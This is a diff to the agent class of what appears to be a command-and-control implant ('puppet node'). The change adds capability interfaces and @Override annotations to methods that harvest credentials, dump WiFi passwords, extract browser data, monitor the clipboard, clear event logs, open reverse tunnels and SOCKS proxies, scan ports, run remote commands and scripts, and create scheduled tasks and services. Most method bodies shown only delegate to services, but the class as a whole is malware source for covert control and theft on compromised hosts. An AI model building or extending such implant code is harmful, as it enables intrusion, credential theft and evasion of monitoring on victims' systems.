@@ -12,6 +12,43 @@ import org.leo.core.net.layer.UrlStrategy;
 import org.leo.core.net.layer.PaddingStrategy;
 import org.leo.core.net.layer.HeaderNoiseStrategy;
 import org.leo.core.puppet.AbstractPuppetNode;
+import org.leo.core.puppet.capability.BasicInfoCapable;
+import org.leo.core.puppet.capability.BrowserDataCapable;
+import org.leo.core.puppet.capability.CatalinaManageCapable;
+import org.leo.core.puppet.capability.ClipboardCapable;
+import org.leo.core.puppet.capability.ComponentInvokeCapable;
+import org.leo.core.puppet.capability.ComponentManageCapable;
+import org.leo.core.puppet.capability.CredentialHarvestCapable;
+import org.leo.core.puppet.capability.DiskCapable;
+import org.leo.core.puppet.capability.DockerCapable;
+import org.leo.core.puppet.capability.EventLogCapable;
+import org.leo.core.puppet.capability.FileCapable;
+import org.leo.core.puppet.capability.FirewallCapable;
+import org.leo.core.puppet.capability.HttpProxyCapable;
+import org.leo.core.puppet.capability.HttpSenderCapable;
+import org.leo.core.puppet.capability.InstalledSoftwareCapable;
+import org.leo.core.puppet.capability.JavaPluginCapable;
+import org.leo.core.puppet.capability.HostScopedCapable;
+import org.leo.core.puppet.capability.LoadedComponentCacheCapable;
+import org.leo.core.puppet.capability.LocalForwardCapable;
+import org.leo.core.puppet.capability.NetworkConnectionCapable;
+import org.leo.core.puppet.capability.NetworkInfoCapable;
+import org.leo.core.puppet.capability.NetworkShareCapable;
+import org.leo.core.puppet.capability.PersistenceCapable;
+import org.leo.core.puppet.capability.ProcessCapable;
+import org.leo.core.puppet.capability.RegistryCapable;
+import org.leo.core.puppet.capability.ResourceCapable;
+import org.leo.core.puppet.capability.ReverseTunnelCapable;
+import org.leo.core.puppet.capability.ScanCapable;
+import org.leo.core.puppet.capability.ScheduledTaskCapable;
+import org.leo.core.puppet.capability.ScriptCapable;
+import org.leo.core.puppet.capability.ServiceCapable;
+import org.leo.core.puppet.capability.SqlCapable;
+import org.leo.core.puppet.capability.Socks5ProxyCapable;
+import org.leo.core.puppet.capability.SuidCapabilityCapable;
+import org.leo.core.puppet.capability.TerminalCapable;
+import org.leo.core.puppet.capability.UserAccountCapable;
+import org.leo.core.puppet.capability.WifiProfileCapable;
 import org.leo.core.puppet.service.*;
 
 import java.util.ArrayList;
@@ -21,7 +58,7 @@ import java.util.List;
 import java.util.Map;
 import java.util.Set;
 
-public class JavaPuppetNode extends AbstractPuppetNode {
+public class JavaPuppetNode extends AbstractPuppetNode implements BasicInfoCapable, TerminalCapable, FileCapable, NetworkInfoCapable, DiskCapable, SqlCapable, ScriptCapable, ResourceCapable, ClipboardCapable, BrowserDataCapable, HttpSenderCapable, ProcessCapable, RegistryCapable, ScheduledTaskCapable, ServiceCapable, EventLogCapable, UserAccountCapable, FirewallCapable, NetworkConnectionCapable, NetworkShareCapable, InstalledSoftwareCapable, WifiProfileCapable, PersistenceCapable, DockerCapable, SuidCapabilityCapable, HttpProxyCapable, LocalForwardCapable, ReverseTunnelCapable, Socks5ProxyCapable, ScanCapable, ComponentInvokeCapable, ComponentManageCapable, CatalinaManageCapable, JavaPluginCapable, CredentialHarvestCapable, HostScopedCapable, LoadedComponentCacheCapable {
 
     private int maxReqCount;
 
@@ -94,6 +131,7 @@ public class JavaPuppetNode extends AbstractPuppetNode {
     }
 
 
+    @Override
     public void setHostId(String hostId) {
         this.hostId = hostId;
         basicInfoService.setHostId(this.hostId);
@@ -247,6 +285,7 @@ public class JavaPuppetNode extends AbstractPuppetNode {
         }
     }
 
+    @Override
     public void addLoadedComponent(String hostId, Set<String> loadedComponent){
         allLoadedComponent.put(hostId,loadedComponent);
         // 同步到所有 ComponentService 实例，避免重复加载
@@ -344,34 +383,42 @@ public class JavaPuppetNode extends AbstractPuppetNode {
     }
 
 
+    @Override
     public Map<String, Object> getBasicInfo() throws Exception {
         return basicInfoService.basicInfo();
     }
 
+    @Override
     public Map<String, Object> startScanPort(String scanHost, int[] scanPorts, int scanTimeout, int threadsNum) throws Exception {
         return scanService.startScanPort(scanHost, scanPorts, scanTimeout, threadsNum);
     }
 
+    @Override
     public Map<String, Object> queryScanPortResult(String taskId) throws Exception {
         return scanService.queryScanPortResult(taskId);
     }
 
+    @Override
     public Map<String, Object> pauseScanPort(String taskId) throws Exception {
         return scanService.pauseScanPort(taskId);
     }
 
+    @Override
     public Map<String, Object> resumeScanPort(String taskId) throws Exception {
         return scanService.resumeScanPort(taskId);
     }
 
+    @Override
     public Map<String, Object> stopScanPort(String taskId) throws Exception {
         return scanService.stopScanPort(taskId);
     }
 
-    public Map<String, Object> scanReachableHost(ArrayList scanHostsList, int scanTimeout) throws Exception {
+    @Override
+    public Map<String, Object> scanReachableHost(ArrayList<String> scanHostsList, int scanTimeout) throws Exception {
         return scanService.scanReachableHost(scanHostsList, scanTimeout);
     }
 
+    @Override
     public Map<String, Object> loadComponent(String componentId) throws Exception {
         return componentService.loadComponent(componentId);
 
@@ -382,30 +429,37 @@ public class JavaPuppetNode extends AbstractPuppetNode {
 
     }
 
+    @Override
     public Map<String, Object> getFileList(String path) throws Exception {
         return fileService.getFileList(path);
     }
 
+    @Override
     public Map<String, Object> getRootList() throws Exception {
         return fileService.getRootList();
     }
 
+    @Override
     public Map<String, Object> fileDownloadChunk(String path, long size, long offset) throws Exception {
         return fileService.fileDownloadChunk(path, size, offset);
     }
 
+    @Override
     public Map<String, Object> fileUploadChunk(String path, long offset, byte[] data) throws Exception {
         return fileService.fileUploadChunk(path, offset, data);
     }
 
+    @Override
     public Map<String, Object> getFileMD5(String path) throws Exception {
         return fileService.getFileMD5(path);
     }
 
+    @Override
     public Map<String, Object> createDir(String dirName) throws Exception {
         return fileService.createDir(dirName);
     }
 
+    @Override
     public Map<String, Object> deleteFile(String path) throws Exception {
         return fileService.deleteFile(path);
     }
@@ -414,6 +468,7 @@ public class JavaPuppetNode extends AbstractPuppetNode {
         return fileService.copyFile(srcPath, destPath);
     }
 
+    @Override
     public Map<String, Object> copyFile(String srcPath, String destPath, String conflictStrategy) throws Exception {
         return fileService.copyFile(srcPath, destPath, conflictStrategy);
     }
@@ -422,83 +477,104 @@ public class JavaPuppetNode extends AbstractPuppetNode {
         return fileService.moveFile(srcPath, newPath);
     }
 
+    @Override
     public Map<String, Object> moveFile(String srcPath, String newPath, String conflictStrategy) throws Exception {
         return fileService.moveFile(srcPath, newPath, conflictStrategy);
     }
 
+    @Override
     public Map<String, Object> createFile(String path, String content) throws Exception {
         return fileService.createFile(path, content);
     }
 
+    @Override
     public Map<String, Object> compressFile(String src, String des, String excludePattern) throws Exception {
         return fileService.compress(src, des, excludePattern);
     }
 
+    @Override
     public Map<String, Object> editFile(String path, String content) throws Exception {
         return fileService.editFile(path, content);
     }
 
+    @Override
     public Map<String, Object> decompressFile(String src, String des) throws Exception {
         return fileService.decompress(src, des);
     }
 
+    @Override
     public Map<String, Object> execCommand(String type, String cmd, String processId) throws Exception {
         if ("write".equals(type)) return commandService.write(cmd, processId);
         if ("read".equals(type))  return commandService.read(processId);
         if ("stop".equals(type))  return commandService.stop(processId);
         return new HashMap<String, Object>();
     }
+
+    @Override
     public Map<String, Object> execSimpleCommand(String cmd) throws Exception {
         return commandService.execSimpleCommand(cmd);
     }
 
+    @Override
     public Map<String, Object> execSimpleCommand(String cmd, int timeoutSeconds) throws Exception {
         return commandService.execSimpleCommand(cmd, timeoutSeconds);
     }
 
+    @Override
     public Map<String, Object> execScript(String language, String script) throws Exception {
         return execScriptService.execScript(language, script);
     }
 
+    @Override
     public Map<String, Object> execSql(String driverClassName, String jdbcUrl, String user, String password, String sqlScript) throws Exception {
         return sqlService.execSql(driverClassName, jdbcUrl, user, password, sqlScript);
     }
 
+    @Override
     public Map<String, Object> getClassBytecode(String className) throws Exception {
         return resourceService.getClassBytecode(className);
     }
 
+    @Override
     public Map<String, Object> getResource(String resourcePath) throws Exception {
         return resourceService.getResource(resourcePath);
     }
+    @Override
     public Map<String, Object> getCatalinaInfo(String catalinaName, String webFramework) throws Exception {
         return catalinaManageService.getCatalinaInfo(catalinaName, webFramework);
     }
 
+    @Override
     public Map<String, Object> unloadCatalinaFilter(String catalinaName, String contextName, String filterName) throws Exception {
         return catalinaManageService.unloadFilter(catalinaName, contextName, filterName);
     }
 
+    @Override
     public Map<String, Object> unloadCatalinaServlet(String catalinaName, String contextName, String servletPattern) throws Exception {
         return catalinaManageService.unloadServlet(catalinaName, contextName, servletPattern);
     }
 
+    @Override
     public Map<String, Object> unloadCatalinaValve(String catalinaName, String valveId) throws Exception {
         return catalinaManageService.unloadValve(catalinaName, valveId);
     }
 
+    @Override
     public Map<String, Object> unloadCatalinaListener(String catalinaName, String listenerId) throws Exception {
         return catalinaManageService.unloadListener(catalinaName, listenerId);
     }
 
+    @Override
     public Map<String, Object> unloadSpringController(String webFramework, String mappingInfo) throws Exception {
         return catalinaManageService.unloadController(webFramework, mappingInfo);
     }
 
+    @Override
     public Map<String, Object> unloadSpringInterceptor(String webFramework, String interceptorId) throws Exception {
         return catalinaManageService.unloadInterceptor(webFramework, interceptorId);
     }
 
+    @Override
     public synchronized Map<String, Object> startSocks5Proxy(int port) throws Exception {
         HashMap<String, Object> res = new HashMap<String, Object>();
         if (socks5ProxyServer != null) {
@@ -515,6 +591,7 @@ public class JavaPuppetNode extends AbstractPuppetNode {
         return res;
     }
 
+    @Override
     public synchronized Map<String, Object> stopSocks5Proxy() {
         HashMap<String, Object> res = new HashMap<String, Object>();
         if (socks5ProxyServer == null) {
@@ -533,10 +610,24 @@ public class JavaPuppetNode extends AbstractPuppetNode {
         return res;
     }
 
+    @Override
+    public synchronized Map<String, Object> getSocks5ProxyStatus() {
+        HashMap<String, Object> data = new HashMap<String, Object>();
+        if (socks5ProxyServer == null) {
+            data.put("enabled", false);
+            data.put("port", null);
+        } else {
+            data.put("enabled", socks5ProxyServer.isRunning());
+            data.put("port", socks5ProxyServer.getListenPort());
+        }
+        return data;
+    }
+
     /**
      * 获取SOCKS5代理统计信息
      * @return 统计信息快照，如果代理未启动则返回null
      */
+    @Override
     public synchronized Socks5ProxyStatistics.StatisticsSnapshot getSocks5ProxyStatistics() {
         if (socks5ProxyServer == null) {
             return null;
@@ -553,6 +644,7 @@ public class JavaPuppetNode extends AbstractPuppetNode {
     /**
      * 启动 HTTP 代理服务器
      */
+    @Override
     public synchronized Map<String, Object> startHttpProxy(int port) throws Exception {
         Map<String, Object> res = new HashMap<String, Object>();
         if (httpProxyServer != null && httpProxyServer.isRunning()) {
@@ -571,6 +663,7 @@ public class JavaPuppetNode extends AbstractPuppetNode {
     /**
      * 停止 HTTP 代理服务器
      */
+    @Override
     public synchronized Map<String, Object> stopHttpProxy() {
         Map<String, Object> res = new HashMap<String, Object>();
         if (httpProxyServer == null || !httpProxyServer.isRunning()) {
@@ -588,6 +681,7 @@ public class JavaPuppetNode extends AbstractPuppetNode {
     /**
      * 获取 HTTP 代理状态
      */
+    @Override
     public synchronized Map<String, Object> getHttpProxyStatus() {
         Map<String, Object> res = new HashMap<String, Object>();
         if (httpProxyServer != null && httpProxyServer.isRunning()) {
@@ -602,6 +696,7 @@ public class JavaPuppetNode extends AbstractPuppetNode {
     /**
      * 获取 HTTP 代理统计信息
      */
+    @Override
     public synchronized Socks5ProxyStatistics.StatisticsSnapshot getHttpProxyStatistics() {
         if (httpProxyServer == null) return null;
         Socks5ProxyStatistics stats = httpProxyServer.getStatistics();
@@ -613,6 +708,7 @@ public class JavaPuppetNode extends AbstractPuppetNode {
     /**
      * 启动本地端口转发
      */
+    @Override
     public synchronized Map<String, Object> startLocalForward(int localPort, String targetHost, int targetPort) throws Exception {
         Map<String, Object> res = new HashMap<String, Object>();
         if (localForwardServers.containsKey(localPort)) {
@@ -644,6 +740,7 @@ public class JavaPuppetNode extends AbstractPuppetNode {
     /**
      * 停止指定本地端口的转发
      */
+    @Override
     public synchronized Map<String, Object> stopLocalForward(int localPort) {
         Map<String, Object> res = new HashMap<String, Object>();
         LocalForwardServer srv = localForwardServers.remove(localPort);
@@ -661,6 +758,7 @@ public class JavaPuppetNode extends AbstractPuppetNode {
     /**
      * 停止所有本地端口转发
      */
+    @Override
     public synchronized Map<String, Object> stopAllLocalForwards() {
         for (LocalForwardServer srv : localForwardServers.values()) {
             srv.stop();
@@ -676,6 +774,7 @@ public class JavaPuppetNode extends AbstractPuppetNode {
     /**
      * 列出所有本地端口转发规则
      */
+    @Override
     public synchronized java.util.List<Map<String, Object>> listLocalForwards() {
         java.util.List<Map<String, Object>> list = new java.util.ArrayList<Map<String, Object>>();
         for (LocalForwardServer srv : localForwardServers.values()) {
@@ -692,6 +791,7 @@ public class JavaPuppetNode extends AbstractPuppetNode {
     /**
      * 获取指定本地端口转发的统计信息
      */
+    @Override
     public synchronized Socks5ProxyStatistics.StatisticsSnapshot getLocalForwardStatistics(int localPort) {
         LocalForwardServer srv = localForwardServers.get(localPort);
         if (srv == null) return null;
@@ -704,6 +804,7 @@ public class JavaPuppetNode extends AbstractPuppetNode {
     /**
      * 启动反向隧道：在 puppet 端监听 remoteListenPort，把进入的连接转发到 C2 侧的 forwardHost:forwardPort。
      */
+    @Override
     public synchronized Map<String, Object> startReverseTunnel(int remoteListenPort, String bindAddr,
                                                                 String forwardHost, int forwardPort) throws Exception {
         Map<String, Object> res = new HashMap<String, Object>();
@@ -746,6 +847,7 @@ public class JavaPuppetNode extends AbstractPuppetNode {
     /**
      * 停止指定反向隧道
      */
+    @Override
     public synchronized Map<String, Object> stopReverseTunnel(String listenId) {
         Map<String, Object> res = new HashMap<String, Object>();
         ReverseTunnelServer srv = reverseTunnels.remove(listenId);
@@ -763,6 +865,7 @@ public class JavaPuppetNode extends AbstractPuppetNode {
     /**
      * 停止所有反向隧道
      */
+    @Override
     public synchronized Map<String, Object> stopAllReverseTunnels() {
         for (ReverseTunnelServer srv : reverseTunnels.values()) {
             try { srv.stop(); } catch (Exception ignored) {}
@@ -778,6 +881,7 @@ public class JavaPuppetNode extends AbstractPuppetNode {
     /**
      * 列出所有反向隧道规则
      */
+    @Override
     public synchronized java.util.List<Map<String, Object>> listReverseTunnels() {
         java.util.List<Map<String, Object>> list = new java.util.ArrayList<Map<String, Object>>();
         for (ReverseTunnelServer srv : reverseTunnels.values()) {
@@ -797,6 +901,7 @@ public class JavaPuppetNode extends AbstractPuppetNode {
     /**
      * 获取指定反向隧道的统计信息
      */
+    @Override
     public synchronized Socks5ProxyStatistics.StatisticsSnapshot getReverseTunnelStatistics(String listenId) {
         ReverseTunnelServer srv = reverseTunnels.get(listenId);
         if (srv == null) return null;
@@ -806,6 +911,7 @@ public class JavaPuppetNode extends AbstractPuppetNode {
 
     // ==================== HTTP 请求 ====================
 
+    @Override
     public Map<String, Object> httpRequest(String method, String url, Map<String, String> headers,
                                            String body, int connectTimeout, int readTimeout,
                                            boolean followRedirects) throws Exception {
@@ -826,32 +932,39 @@ public class JavaPuppetNode extends AbstractPuppetNode {
 
     // ==================== 凭据采集 ====================
 
+    @Override
     public Map<String, Object> harvestCredentials(String filter) throws Exception {
         return credentialHarvestService.harvestAll(filter);
     }
 
+    @Override
     public Map<String, Object> harvestDataSources() throws Exception {
         return credentialHarvestService.harvestDataSources();
     }
 
+    @Override
     public Map<String, Object> harvestSystemProperties(String filter) throws Exception {
         return credentialHarvestService.harvestSystemProperties(filter);
     }
 
+    @Override
     public Map<String, Object> harvestEnvVars(String filter) throws Exception {
         return credentialHarvestService.harvestEnvVars(filter);
     }
 
+    @Override
     public Map<String, Object> harvestJndi() throws Exception {
         return credentialHarvestService.harvestJndi();
     }
 
+    @Override
     public Map<String, Object> harvestSpringEnv(String filter) throws Exception {
         return credentialHarvestService.harvestSpringEnv(filter);
     }
 
     // ==================== 网络信息 ====================
 
+    @Override
     public Map<String, Object> collectNetworkInfo() throws Exception {
         return networkInfoService.collectAll();
     }
@@ -882,12 +995,14 @@ public class JavaPuppetNode extends AbstractPuppetNode {
 
     // ==================== HTTP 发包（Repeater + Fuzzer） ====================
 
+    @Override
     public Map<String, Object> sendRawHttp(String rawHttp, String targetHost, int targetPort,
                                            boolean useTls, boolean followRedirects,
                                            int connectTimeout, int readTimeout) throws Exception {
         return httpSenderService.sendRawHttp(rawHttp, targetHost, targetPort, useTls, followRedirects, connectTimeout, readTimeout);
     }
 
+    @Override
     public Map<String, Object> startFuzz(String rawHttp, Map<String, List<String>> payloads,
                                          String targetHost, int targetPort, boolean useTls,
                                          int threads, int delayMs,
@@ -895,148 +1010,180 @@ public class JavaPuppetNode extends AbstractPuppetNode {
         return httpSenderService.startFuzz(rawHttp, payloads, targetHost, targetPort, useTls, threads, delayMs, matchRules);
     }
 
+    @Override
     public Map<String, Object> queryFuzz(String taskId) {
         return httpSenderService.queryFuzz(taskId);
     }
 
+    @Override
     public Map<String, Object> stopFuzz(String taskId) {
         return httpSenderService.stopFuzz(taskId);
     }
 
     // ==================== 进程管理 ====================
 
+    @Override
     public Map<String, Object> listProcesses() throws Exception {
         return processService.listProcesses();
     }
 
+    @Override
     public Map<String, Object> findProcesses(String name, int pid, int port) throws Exception {
         return processService.find(name, pid, port);
     }
 
+    @Override
     public Map<String, Object> killProcess(int pid, boolean force) throws Exception {
         return processService.killProcess(pid, force);
     }
 
     // ==================== 注册表管理 ====================
 
+    @Override
     public Map<String, Object> queryRegistry(String keyPath, boolean recursive) throws Exception {
         return registryService.query(keyPath, recursive);
     }
 
+    @Override
     public Map<String, Object> searchRegistry(String keyPath, String pattern, String searchTarget, int maxResults) throws Exception {
         return registryService.search(keyPath, pattern, searchTarget, maxResults);
     }
 
+    @Override
     public Map<String, Object> addRegistry(String keyPath, String valueName, String valueType, String valueData, boolean force) throws Exception {
         return registryService.add(keyPath, valueName, valueType, valueData, force);
     }
 
+    @Override
     public Map<String, Object> deleteRegistry(String keyPath, String valueName, boolean force) throws Exception {
         return registryService.delete(keyPath, valueName, force);
     }
 
+    @Override
     public Map<String, Object> exportRegistry(String keyPath) throws Exception {
         return registryService.export(keyPath);
     }
 
     // ==================== 计划任务管理 ====================
 
+    @Override
     public Map<String, Object> listScheduledTasks() throws Exception {
         return scheduledTaskService.list();
     }
 
+    @Override
     public Map<String, Object> queryScheduledTask(String taskName) throws Exception {
         return scheduledTaskService.query(taskName);
     }
 
+    @Override
     public Map<String, Object> createScheduledTaskWindows(String taskName, String command, String schedule,
                                                            String modifier, String startTime, String startDate,
                                                            String runAs, boolean force) throws Exception {
         return scheduledTaskService.createWindows(taskName, command, schedule, modifier, startTime, startDate, runAs, force);
     }
 
+    @Override
     public Map<String, Object> createScheduledTaskLinux(String cronExpression, String command) throws Exception {
         return scheduledTaskService.createLinux(cronExpression, command);
     }
 
+    @Override
     public Map<String, Object> deleteScheduledTask(String taskName) throws Exception {
         return scheduledTaskService.delete(taskName);
     }
 
+    @Override
     public Map<String, Object> runScheduledTask(String taskName) throws Exception {
         return scheduledTaskService.run(taskName);
     }
 
+    @Override
     public Map<String, Object> enableScheduledTask(String taskName) throws Exception {
         return scheduledTaskService.enable(taskName);
     }
 
+    @Override
     public Map<String, Object> disableScheduledTask(String taskName) throws Exception {
         return scheduledTaskService.disable(taskName);
     }
 
     // ==================== 服务管理 ====================
 
+    @Override
     public Map<String, Object> listServices() throws Exception {
         return serviceManagerService.list();
     }
 
+    @Override
     public Map<String, Object> queryService(String serviceName) throws Exception {
         return serviceManagerService.query(serviceName);
     }
 
+    @Override
     public Map<String, Object> startService(String serviceName) throws Exception {
         return serviceManagerService.start(serviceName);
     }
 
+    @Override
     public Map<String, Object> stopService(String serviceName) throws Exception {
         return serviceManagerService.stop(serviceName);
     }
 
+    @Override
     public Map<String, Object> restartService(String serviceName) throws Exception {
         return serviceManagerService.restart(serviceName);
     }
 
+    @Override
     public Map<String, Object> enableService(String serviceName) throws Exception {
         return serviceManagerService.enable(serviceName);
     }
 
+    @Override
     public Map<String, Object> disableService(String serviceName) throws Exception {
         return serviceManagerService.disable(serviceName);
     }
 
+    @Override
     public Map<String, Object> createService(String serviceName, String binPath, String displayName, String startType) throws Exception {
         return serviceManagerService.create(serviceName, binPath, displayName, startType);
     }
 
+    @Override
     public Map<String, Object> deleteService(String serviceName) throws Exception {
         return serviceManagerService.delete(serviceName);
     }
 
     // ==================== 事件日志管理 ====================
 
+    @Override
     public Map<String, Object> listEventLogSources() throws Exception {
         return eventLogService.listSources();
     }
 
+    @Override
     public Map<String, Object> queryEventLog(String source, int maxEntries, String keyword,
                                              String level, String since, String until,
                                              String eventId) throws Exception {
         return eventLogService.query(source, maxEntries, keyword, level, since, until, eventId);
     }
 
+    @Override
     public Map<String, Object> queryEventLog(String source, int maxEntries, String keyword,
                                              String level, String since, String until,
                                              String eventId, String format) throws Exception {
         return eventLogService.query(source, maxEntries, keyword, level, since, until, eventId, format);
     }
 
+    @Override
     public Map<String, Object> queryEventLog(String source, int maxEntries, String keyword,
                                              String level, String since, String until,
                                              String eventId, String format, int maxBytes) throws Exception {
         return eventLogService.query(source, maxEntries, keyword, level, since, until, eventId, format, maxBytes);
     }
 
+    @Override
     public Map<String, Object> queryEventLog(String source, int maxEntries, String keyword,
                                              String level, String since, String until,
                                              String eventId, String format, int maxBytes,
@@ -1047,14 +1194,17 @@ public class JavaPuppetNode extends AbstractPuppetNode {
                 cursor, direction, minStatus, maxStatus, ipPrefix, pathPrefix);
     }
 
+    @Override
     public Map<String, Object> getEventLogStats(String source) throws Exception {
         return eventLogService.stats(source);
     }
 
+    @Override
     public Map<String, Object> clearEventLog(String source) throws Exception {
         return eventLogService.clear(source);
     }
 
+    @Override
     public Map<String, Object> aggregateEventLog(String source, String format, String groupBy,
                                                  int topN, int maxScan, String keyword,
                                                  Integer minStatus, Integer maxStatus,
@@ -1063,6 +1213,7 @@ public class JavaPuppetNode extends AbstractPuppetNode {
                 minStatus, maxStatus, ipPrefix, pathPrefix);
     }
 
+    @Override
     public Map<String, Object> aggregateEventLog(String source, String format, String groupBy,
                                                  int topN, int maxScan, int maxBytes, String keyword,
                                                  Integer minStatus, Integer maxStatus,
@@ -1071,256 +1222,312 @@ public class JavaPuppetNode extends AbstractPuppetNode {
                 minStatus, maxStatus, ipPrefix, pathPrefix, slow);
     }
 
+    @Override
     public Map<String, Object> previewEventLog(String source, int lines, boolean fromTail) throws Exception {
         return eventLogService.meta(source, null, lines, fromTail);
     }
 
+    @Override
     public Map<String, Object> metaEventLog(String source, String format) throws Exception {
         return eventLogService.meta(source, format);
     }
 
+    @Override
     public Map<String, Object> metaEventLog(String source, String format, int lines, boolean fromTail) throws Exception {
         return eventLogService.meta(source, format, lines, fromTail);
     }
 
     // ==================== 用户账户管理 ====================
 
+    @Override
     public Map<String, Object> listUsers() throws Exception {
         return userAccountService.listUsers();
     }
 
+    @Override
     public Map<String, Object> listGroups() throws Exception {
         return userAccountService.listGroups();
     }
 
+    @Override
     public Map<String, Object> queryUser(String username) throws Exception {
         return userAccountService.queryUser(username);
     }
 
+    @Override
     public Map<String, Object> queryGroup(String groupName) throws Exception {
         return userAccountService.queryGroup(groupName);
     }
 
+    @Override
     public Map<String, Object> whoami() throws Exception {
         return userAccountService.whoami();
     }
 
     // ==================== 防火墙管理 ====================
 
+    @Override
     public Map<String, Object> getFirewallStatus() throws Exception {
         return firewallService.status();
     }
 
+    @Override
     public Map<String, Object> listFirewallRules(String direction, String profile) throws Exception {
         return firewallService.listRules(direction, profile);
     }
 
+    @Override
     public Map<String, Object> addFirewallRule(String ruleName, String direction, String action,
                                                 String protocol, String localPort, String remotePort,
                                                 String remoteAddress, String rawRule) throws Exception {
         return firewallService.addRule(ruleName, direction, action, protocol, localPort, remotePort, remoteAddress, rawRule);
     }
 
+    @Override
     public Map<String, Object> deleteFirewallRule(String ruleName, String ruleIndex, String rawRule) throws Exception {
         return firewallService.deleteRule(ruleName, ruleIndex, rawRule);
     }
 
+    @Override
     public Map<String, Object> toggleFirewall(boolean enable) throws Exception {
         return firewallService.toggleFirewall(enable);
     }
 
     // ==================== 网络共享管理 ====================
 
+    @Override
     public Map<String, Object> listNetworkShares() throws Exception {
         return networkShareService.listShares();
     }
 
+    @Override
     public Map<String, Object> listNetworkMounts() throws Exception {
         return networkShareService.listMounts();
     }
 
+    @Override
     public Map<String, Object> queryNetworkShare(String shareName) throws Exception {
         return networkShareService.queryShare(shareName);
     }
 
+    @Override
     public Map<String, Object> connectNetworkShare(String remotePath, String localDrive,
                                                     String mountPoint, String username,
                                                     String password) throws Exception {
         return networkShareService.connectShare(remotePath, localDrive, mountPoint, username, password);
     }
 
+    @Override
     public Map<String, Object> disconnectNetworkShare(String target) throws Exception {
         return networkShareService.disconnectShare(target);
     }
 
     // ==================== 已安装软件枚举 ====================
 
+    @Override
     public Map<String, Object> listAllSoftware() throws Exception {
         return installedSoftwareService.listAll();
     }
 
+    @Override
     public Map<String, Object> listSystemSoftware() throws Exception {
         return installedSoftwareService.listSystem();
     }
 
+    @Override
     public Map<String, Object> listUserSoftware() throws Exception {
         return installedSoftwareService.listUser();
     }
 
+    @Override
     public Map<String, Object> searchSoftware(String keyword) throws Exception {
         return installedSoftwareService.searchSoftware(keyword);
     }
 
     // ==================== Docker 容器管理 ====================
 
+    @Override
     public Map<String, Object> listDockerContainers(boolean all) throws Exception {
         return dockerContainerService.listContainers(all);
     }
 
+    @Override
     public Map<String, Object> listDockerImages() throws Exception {
         return dockerContainerService.listImages();
     }
 
+    @Override
     public Map<String, Object> inspectDockerContainer(String containerId) throws Exception {
         return dockerContainerService.inspectContainer(containerId);
     }
 
+    @Override
     public Map<String, Object> getDockerContainerLogs(String containerId, int tail) throws Exception {
         return dockerContainerService.containerLogs(containerId, tail);
     }
 
+    @Override
     public Map<String, Object> listDockerNetworks() throws Exception {
         return dockerContainerService.listNetworks();
     }
 
+    @Override
     public Map<String, Object> getDockerInfo() throws Exception {
         return dockerContainerService.dockerInfo();
     }
 
+    @Override
     public Map<String, Object> execInDockerContainer(String containerId, String cmd) throws Exception {
         return dockerContainerService.execInContainer(containerId, cmd);
     }
 
+    @Override
     public Map<String, Object> startDockerContainer(String containerId) throws Exception {
         return dockerContainerService.startContainer(containerId);
     }
 
+    @Override
     public Map<String, Object> stopDockerContainer(String containerId, int timeout) throws Exception {
         return dockerContainerService.stopContainer(containerId, timeout);
     }
 
+    @Override
     public Map<String, Object> restartDockerContainer(String containerId, int timeout) throws Exception {
         return dockerContainerService.restartContainer(containerId, timeout);
     }
 
+    @Override
     public Map<String, Object> pauseDockerContainer(String containerId) throws Exception {
         return dockerContainerService.pauseContainer(containerId);
     }
 
+    @Override
     public Map<String, Object> unpauseDockerContainer(String containerId) throws Exception {
         return dockerContainerService.unpauseContainer(containerId);
     }
 
+    @Override
     public Map<String, Object> removeDockerContainer(String containerId, boolean force) throws Exception {
         return dockerContainerService.removeContainer(containerId, force);
     }
 
+    @Override
     public Map<String, Object> removeDockerImage(String imageId, boolean force) throws Exception {
         return dockerContainerService.removeImage(imageId, force);
     }
 
     // ==================== SUID/SGID/Capabilities 枚举 ====================
 
+    @Override
     public Map<String, Object> listSuidFiles() throws Exception {
         return suidCapabilityService.listSuid();
     }
 
+    @Override
     public Map<String, Object> listSgidFiles() throws Exception {
         return suidCapabilityService.listSgid();
     }
 
+    @Override
     public Map<String, Object> listFileCapabilities() throws Exception {
         return suidCapabilityService.listCapabilities();
     }
 
+    @Override
     public Map<String, Object> listAllSuidCaps() throws Exception {
         return suidCapabilityService.listAll();
     }
 
     // ==================== 浏览器数据提取 ====================
 
+    @Override
     public Map<String, Object> scanBrowserProfiles() throws Exception {
         return browserDataService.scanProfiles();
     }
 
+    @Override
     public Map<String, Object> extractBrowserBookmarks() throws Exception {
         return browserDataService.extractBookmarks();
     }
 
+    @Override
     public Map<String, Object> extractBrowserHistory(int limit) throws Exception {
         return browserDataService.extractHistory(limit);
     }
 
+    @Override
     public Map<String, Object> listBrowserSensitiveFiles() throws Exception {
         return browserDataService.listSensitiveFiles();
     }
 
     // ==================== WiFi 配置提取 ====================
 
+    @Override
     public Map<String, Object> listWifiProfiles() throws Exception {
         return wifiProfileService.listProfiles();
     }
 
+    @Override
     public Map<String, Object> getWifiProfileDetail(String profileName) throws Exception {
         return wifiProfileService.profileDetail(profileName);
     }
 
+    @Override
     public Map<String, Object> dumpAllWifiPasswords() throws Exception {
         return wifiProfileService.dumpAllPasswords();
     }
 
     // ==================== Persistence ====================
 
+    @Override
     public Map<String, Object> listPersistence() throws Exception {
         return persistenceService.list();
     }
 
+    @Override
     public Map<String, Object> queryPersistence(String name, String type, String path) throws Exception {
         return persistenceService.query(name, type, path);
     }
 
     // ==================== NetworkConnection ====================
 
+    @Override
     public Map<String, Object> listNetworkConnections(String state, String protocol, String port,
                                                        String pid, String process, String remoteIp,
                                                        boolean listeningOnly, int maxEntries) throws Exception {
         return networkConnectionService.list(state, protocol, port, pid, process, remoteIp, listeningOnly, maxEntries);
     }
 
+    @Override
     public Map<String, Object> listNetworkConnections() throws Exception {
         return networkConnectionService.list();
     }
 
+    @Override
     public Map<String, Object> networkConnectionSummary() throws Exception {
         return networkConnectionService.summary();
     }
 
     // ==================== 挂载磁盘枚举 ====================
 
+    @Override
     public Map<String, Object> listMountDisks() throws Exception {
         return mountDiskService.list();
     }
 
     // ==================== 剪贴板操作 ====================
 
+    @Override
     public Map<String, Object> readClipboard() throws Exception {
         return clipboardService.read();
     }
 
+    @Override
     public Map<String, Object> writeClipboard(String content) throws Exception {
         return clipboardService.write(content);
     }
 
+    @Override
     public Map<String, Object> monitorClipboard(int duration, int interval) throws Exception {
         return clipboardService.monitor(duration, interval);
     }
